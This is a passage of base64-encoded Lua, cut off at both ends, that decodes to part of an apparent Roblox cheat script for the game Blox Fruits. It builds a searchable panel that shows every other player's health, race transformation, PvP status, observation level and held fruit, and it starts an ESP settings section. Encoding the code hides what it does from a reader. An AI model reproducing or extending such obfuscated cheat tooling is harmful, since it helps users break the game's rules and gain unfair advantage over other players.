tMzAsIDAsIDApCiAgICAgICAgICAgICAgICBDbG9zZUJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgQ2xvc2VCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgNTAsIDUwKQogICAgICAgICAgICAgICAgQ2xvc2VCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgICAgICAgICBDbG9zZUJ0bi5UZXh0U2l6ZSA9IDEyCiAgICAgICAgICAgICAgICBDbG9zZUJ0bi5QYXJlbnQgPSBIZWFkZXIKICAgICAgICAgICAgICAgIENsb3NlQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKSBWaXpGcmFtZS5WaXNpYmxlID0gZmFsc2UgZW5kKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBTZWFyY2gKICAgICAgICAgICAgICAgIGxvY2FsIFNlYXJjaEJveCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCiAgICAgICAgICAgICAgICBTZWFyY2hCb3guU2l6ZSA9IFVEaW0yLm5ldygxLCAtMjAsIDAsIDI1KQogICAgICAgICAgICAgICAgU2VhcmNoQm94LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAzNSkKICAgICAgICAgICAgICAgIFNlYXJjaEJveC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgICAgICAgICAgICAgIFNlYXJjaEJveC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIFNlYXJjaEJveC5QbGFjZWhvbGRlclRleHQgPSAiU2VhcmNoIFBsYXllci4uLiIKICAgICAgICAgICAgICAgIFNlYXJjaEJveC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgICAgICAgICAgU2VhcmNoQm94LlRleHRTaXplID0gMTAKICAgICAgICAgICAgICAgIFNlYXJjaEJveC5QYXJlbnQgPSBWaXpGcmFtZQogICAgICAgICAgICAgICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIFNlYXJjaEJveCkuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gTGlzdAogICAgICAgICAgICAgICAgbG9jYWwgTGlzdCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgICAgICAgICAgICAgTGlzdC5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMSwgLTcwKQogICAgICAgICAgICAgICAgTGlzdC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA1LCAwLCA2NSkKICAgICAgICAgICAgICAgIExpc3QuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIExpc3QuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgICAgICAgICAgTGlzdC5TY3JvbGxCYXJUaGlja25lc3MgPSA0CiAgICAgICAgICAgICAgICBMaXN0LlBhcmVudCA9IFZpekZyYW1lCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIExpc3RMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpCiAgICAgICAgICAgICAgICBMaXN0TGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICBMaXN0TGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA1KQogICAgICAgICAgICAgICAgTGlzdExheW91dC5QYXJlbnQgPSBMaXN0CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNvbG9yVGV4dCh0ZXh0LCBjb2xvcikKICAgICAgICAgICAgICAgICAgICBsb2NhbCByLCBnLCBiID0gbWF0aC5mbG9vcihjb2xvci5SKjI1NSksIG1hdGguZmxvb3IoY29sb3IuRyoyNTUpLCBtYXRoLmZsb29yKGNvbG9yLkIqMjU1KQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmcuZm9ybWF0KCc8Zm9udCBjb2xvcj0icmdiKCVkLCVkLCVkKSI+JXM8L2ZvbnQ+JywgciwgZywgYiwgdGV4dCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBVcGRhdGVMaXN0KCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgVml6RnJhbWUuVmlzaWJsZSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhMaXN0OkdldENoaWxkcmVuKCkpIGRvIGlmIHY6SXNBKCJGcmFtZSIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGZpbHRlciA9IFNlYXJjaEJveC5UZXh0Omxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsdGVyID09ICIiIG9yIHAuTmFtZTpsb3dlcigpOmZpbmQoZmlsdGVyKSBvciBwLkRpc3BsYXlOYW1lOmxvd2VyKCk6ZmluZChmaWx0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBwLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBFbnRyeSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW50cnkuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDcwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW50cnkuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMzApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRyeS5QYXJlbnQgPSBMaXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRW50cnkpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEF2YXRhciA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBdmF0YXIuU2l6ZSA9IFVEaW0yLm5ldygwLCA1MCwgMCwgNTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBdmF0YXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgNSwgMCwgMTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBdmF0YXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF2YXRhci5JbWFnZSA9ICJyYnh0aHVtYjovL3R5cGU9QXZhdGFySGVhZFNob3QmaWQ9IiAuLiBwLlVzZXJJZCAuLiAiJnc9MTUwJmg9MTUwIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQXZhdGFyLlBhcmVudCA9IEVudHJ5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgQXZhdGFyKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBJbmZvTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbmZvTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAtNjUsIDEsIC01KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW5mb0xhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDYwLCAwLCAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW5mb0xhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbmZvTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbmZvTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEluZm9MYWJlbC5UZXh0U2l6ZSA9IDgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEluZm9MYWJlbC5SaWNoVGV4dCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEluZm9MYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW5mb0xhYmVsLlRleHRZQWxpZ25tZW50ID0gRW51bS5UZXh0WUFsaWdubWVudC5Ub3AKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEluZm9MYWJlbC5QYXJlbnQgPSBFbnRyeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocFRleHQgPSBjb2xvclRleHQoIk4vQSIsIENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdjRUZXh0ID0gY29sb3JUZXh0KCJJbmFjdGl2ZSIsIENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHZwVGV4dCA9IGNvbG9yVGV4dCgiVW5rIiwgQ29sb3IzLmZyb21SR0IoMTUwLCAxNTAsIDE1MCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkb2RnZVRleHQgPSBjb2xvclRleHQoIjAiLCBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZydWl0VGV4dCA9IGNvbG9yVGV4dCgiTm9uZSIsIENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGFyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHAgPSBtYXRoLmZsb29yKGh1bS5IZWFsdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG1heEhwID0gbWF0aC5mbG9vcihodW0uTWF4SGVhbHRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAxMDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhwIDwgbWF4SHAgKiAwLjMgdGhlbiBocENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBocCA8IG1heEhwICogMC43IHRoZW4gaHBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjAwLCAwKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHBUZXh0ID0gY29sb3JUZXh0KGhwIC4uICIvIiAuLiBtYXhIcCwgaHBDb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2NE9iaiA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIlJhY2VUcmFuc2Zvcm1lZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjRPYmogYW5kIHY0T2JqOklzQSgiQm9vbFZhbHVlIikgYW5kIHY0T2JqLlZhbHVlIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHY0VGV4dCA9IGNvbG9yVGV4dCgiQWN0aXZlIiwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHY0VGV4dCA9IGNvbG9yVGV4dCgiSW5hY3RpdmUiLCBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIEZydWl0IERldGVjdGlvbiAoRXF1aXBwZWQgb3IgQmFja3BhY2spCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZm91bmRGcnVpdCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZk5hbWUgPSAiTm9uZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdCBpbiBwYWlycyhjaGFyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHQ6SXNBKCJUb29sIikgYW5kIHQuVG9vbFRpcCA9PSAiQmxveCBGcnVpdCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZk5hbWUgPSB0Lk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kRnJ1aXQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgZm91bmRGcnVpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGJwID0gcDpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBicCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdCBpbiBwYWlycyhicDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHQ6SXNBKCJUb29sIikgYW5kIHQuVG9vbFRpcCA9PSAiQmxveCBGcnVpdCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmTmFtZSA9IHQuTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZOYW1lIH49ICJOb25lIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZydWl0VGV4dCA9IGNvbG9yVGV4dChmTmFtZSwgQ29sb3IzLmZyb21SR0IoMjAwLCAxMDAsIDI1NSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gUFZQIC8gU2FmZSBab25lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkZvcmNlRmllbGQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB2cFRleHQgPSBjb2xvclRleHQoIlNhZmUgWm9uZSIsIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMjU1KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHB2cEF0dHIgPSBjaGFyOkdldEF0dHJpYnV0ZSgiUHZQIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHZwQXR0ciA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHZwVmFsID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiUHZQIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB2cFZhbCBhbmQgcHZwVmFsOklzQSgiQm9vbFZhbHVlIikgdGhlbiBwdnBBdHRyID0gcHZwVmFsLlZhbHVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB2cEF0dHIgfj0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB2cEF0dHIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB2cFRleHQgPSBjb2xvclRleHQoIk9uIiwgQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB2cFRleHQgPSBjb2xvclRleHQoIk9mZiIsIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMTAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBUcnkgY2hlY2tpbmcgRGF0YSBmb2xkZXIgaWYgYXZhaWxhYmxlIChzb21lIGdhbWVzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZCA9IHA6RmluZEZpcnN0Q2hpbGQoIkRhdGEiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZFB2cCA9IGQgYW5kIGQ6RmluZEZpcnN0Q2hpbGQoIlB2UCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkUHZwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkUHZwLlZhbHVlIHRoZW4gcHZwVGV4dCA9IGNvbG9yVGV4dCgiT24iLCBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBwdnBUZXh0ID0gY29sb3JUZXh0KCJPZmYiLCBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDEwMCkpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB2cFRleHQgPSBjb2xvclRleHQoIlVuayIsIENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIERvZGdlIChPYnNlcnZhdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkVmFsID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG1heERWYWwgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmlzaW9uID0gcDpGaW5kRmlyc3RDaGlsZCgiVmlzaW9uUmFkaXVzIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2aXNpb24gYW5kIHZpc2lvbjpJc0EoIlZhbHVlQmFzZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZXhwID0gdmlzaW9uLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV4cCA8IDUwIHRoZW4gbWF4RFZhbCA9IDIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGV4cCA8IDMzMCB0aGVuIG1heERWYWwgPSAzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBleHAgPCA4MTUgdGhlbiBtYXhEVmFsID0gNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgZXhwIDwgMTQxNyB0aGVuIG1heERWYWwgPSA1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBleHAgPCAyMTIxIHRoZW4gbWF4RFZhbCA9IDYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGV4cCA8IDI4MjQgdGhlbiBtYXhEVmFsID0gNwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIG1heERWYWwgPSA4IGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG9icyA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIk9ic2VydmF0aW9uIikgb3IgY2hhcjpGaW5kRmlyc3RDaGlsZCgiT2JzZXJ2YXRpb25WMiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9icyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBjIGluIHBhaXJzKGNoYXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG4gPSBzdHJpbmcubG93ZXIoYy5OYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYzpJc0EoIlZhbHVlQmFzZSIpIGFuZCAoc3RyaW5nLmZpbmQobiwgIm9ic2VydmF0aW9uIikgb3Igc3RyaW5nLmZpbmQobiwgImluc3RpbmN0IikpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvYnMgPSBjCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvYnMgYW5kIG9iczpJc0EoIlZhbHVlQmFzZSIpIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRWYWwgPSBvYnMuVmFsdWUgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIG1heERWYWwgPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZFZhbCA9IG1h" .. "eERWYWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBtYXhEVmFsID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvZGdlVGV4dCA9IGNvbG9yVGV4dChkVmFsIC4uICIvIiAuLiBtYXhEVmFsLCBDb2xvcjMuZnJvbVJHQigxMDAsIDIwMCwgMjU1KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRWYWwgPT0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkID0gcDpGaW5kRmlyc3RDaGlsZCgiRGF0YSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkT2JzID0gZCBhbmQgZDpGaW5kRmlyc3RDaGlsZCgiT2JzZXJ2YXRpb24iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZE9icyBhbmQgZE9iczpJc0EoIlZhbHVlQmFzZSIpIHRoZW4gZFZhbCA9IGRPYnMuVmFsdWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2RnZVRleHQgPSBjb2xvclRleHQodG9zdHJpbmcoZFZhbCksIENvbG9yMy5mcm9tUkdCKDEwMCwgMjAwLCAyNTUpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEluZm9MYWJlbC5UZXh0ID0gIjxiPiIgLi4gcC5EaXNwbGF5TmFtZSAuLiAiPC9iPiAoQCIgLi4gcC5OYW1lIC4uICIpXG4iIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICLwn5KaIEhQOiAiIC4uIGhwVGV4dCAuLiAiIHwg4pqhIFY0OiAiIC4uIHY0VGV4dCAuLiAiXG4iIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICLimpTvuI8gUFZQOiAiIC4uIHB2cFRleHQgLi4gIiB8IPCfkYHvuI8gRG9kZ2U6ICIgLi4gZG9kZ2VUZXh0IC4uICJcbiIgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIvCfjY4gRnJ1aXQ6ICIgLi4gZnJ1aXRUZXh0CiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFNlYXJjaEJveDpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlRleHQiKTpDb25uZWN0KFVwZGF0ZUxpc3QpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgYW5kIFZpekZyYW1lIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZpekZyYW1lLlZpc2libGUgdGhlbiBVcGRhdGVMaXN0KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFVwZGF0ZUxpc3QoKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBWaXpGcmFtZS5WaXNpYmxlID0gbm90IFZpekZyYW1lLlZpc2libGUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5WaXN1YWxzLCAiRVNQIFNldHRpbmdzIiwgMSkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5W